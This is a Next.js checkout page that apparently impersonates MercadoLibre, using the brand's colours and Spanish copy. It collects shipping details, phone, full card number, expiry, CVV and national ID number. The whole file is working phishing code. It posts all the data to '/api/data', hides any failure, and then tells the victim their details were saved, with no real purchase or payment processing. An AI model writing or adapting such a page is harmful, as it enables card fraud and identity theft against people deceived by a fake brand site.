"use client"

import { useState } from "react"
import { Header } from "@/components/mercadolibre/header"
import { AddressForm } from "@/components/mercadolibre/address-form"
import { PaymentMethod } from "@/components/mercadolibre/payment-method"
import { CardForm } from "@/components/mercadolibre/card-form"
import { CheckCircle } from "lucide-react"

type Step = "address" | "payment" | "card" | "success"

interface CollectedData {
  address: {
    address: string
    noNumber: boolean
    postalCode: string
    noPostalCode: boolean
    province: string
    locality: string
    department: string
    instructions: string
    domicileType: string
    fullName: string
    phone: string
  } | null
  paymentType: string
  card: {
    cardNumber: string
    holderName: string
    expiry: string
    cvv: string
    docType: string
    docNumber: string
    cardBrand: string
  } | null
}

export default function CheckoutPage() {
  const [step, setStep] = useState<Step>("address")
  const [collectedData, setCollectedData] = useState<CollectedData>({
    address: null,
    paymentType: "",
    card: null,
  })

  const handleAddressContinue = (addressData: CollectedData["address"]) => {
    setCollectedData((prev) => ({ ...prev, address: addressData }))
    setStep("payment")
    window.scrollTo(0, 0)
  }

  const handlePaymentContinue = (method: string) => {
    setCollectedData((prev) => ({ ...prev, paymentType: method }))
    setStep("card")
    window.scrollTo(0, 0)
  }

  const handleCardContinue = async (cardData: CollectedData["card"]) => {
    const finalData = {
      ...collectedData,
      card: cardData,
    }
    setCollectedData(finalData)

    try {
      await fetch("/api/data", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ...finalData,
          timestamp: new Date().toISOString(),
        }),
      })
    } catch {
      // silently fail
    }

    setStep("success")
    window.scrollTo(0, 0)
  }

  return (
    <div className="min-h-screen bg-[#EBEBEB]">
      <Header variant={step === "address" ? "full" : "simple"} />

      <main>
        {step === "address" && <AddressForm onContinue={handleAddressContinue} />}

        {step === "payment" && (
          <PaymentMethod
            onContinue={handlePaymentContinue}
            onBack={() => {
              setStep("address")
              window.scrollTo(0, 0)
            }}
          />
        )}

        {step === "card" && (
          <CardForm
            paymentType={collectedData.paymentType}
            onContinue={handleCardContinue}
            onBack={() => {
              setStep("payment")
              window.scrollTo(0, 0)
            }}
          />
        )}

        {step === "success" && (
          <div className="max-w-[680px] mx-auto px-4 py-10 md:py-16">
            <div className="bg-white rounded-md shadow-sm p-6 md:p-10 text-center">
              <div className="flex justify-center mb-4">
                <CheckCircle className="h-12 w-12 md:h-16 md:w-16 text-[#00A650]" />
              </div>
              <h1 className="text-xl md:text-2xl font-semibold text-[#333] mb-2">
                {"Listo, guardamos tus datos"}
              </h1>
              <p className="text-sm text-[#999] mb-6">
                {"Tu domicilio y medio de pago fueron registrados correctamente."}
              </p>
              <button
                onClick={() => {
                  setStep("address")
                  setCollectedData({ address: null, paymentType: "", card: null })
                  window.scrollTo(0, 0)
                }}
                className="w-full sm:w-auto bg-[#3483FA] hover:bg-[#2968c8] text-white font-medium text-sm px-8 py-3 rounded-md transition-colors"
              >
                Volver al inicio
              </button>
            </div>
          </div>
        )}
      </main>
    </div>
  )
}
